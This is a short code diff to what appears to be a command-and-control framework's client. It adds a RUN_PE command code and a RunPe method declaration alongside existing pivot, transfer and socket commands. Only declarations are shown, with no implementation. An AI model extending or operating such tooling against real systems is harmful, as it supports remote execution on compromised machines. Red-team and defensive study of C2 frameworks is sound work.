@@ -42,6 +42,7 @@ enum class Commands {
     PIVOT                   = 2520,
     TRANSFER                = 2530,
     SOCKET                  = 2540,
+    RUN_PE                  = 2550,
 
     OUTPUT  = 90,
     ERROR   = 91,
@@ -89,6 +90,7 @@ public:
     auto Config( const QString& TaskID, const QString& Key, const QString& Value ) -> void;
     auto Screenshot( const QString& TaskID ) -> void;
     auto Task( const QString& TaskID, const QString& Command ) -> void;
+    auto RunPe( QString TaskID, QString FunctionName, QString Path, QByteArray Args, QString Flags ) -> void;
 
     auto AgentCommand( QMap<string, string> CommandData ) -> void;
 };
